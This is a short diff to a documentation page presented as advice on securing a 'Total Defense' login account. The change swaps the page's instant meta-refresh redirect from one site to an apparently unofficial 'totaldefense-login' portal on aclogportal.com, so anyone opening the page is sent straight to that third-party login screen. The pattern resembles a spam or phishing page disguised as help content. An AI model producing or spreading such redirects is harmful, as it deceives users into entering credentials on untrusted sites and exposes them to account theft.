@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://tek.chat/">
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/totaldefense-login">
 
 How to Secure Your Total Defense Login Account?
 ============================================
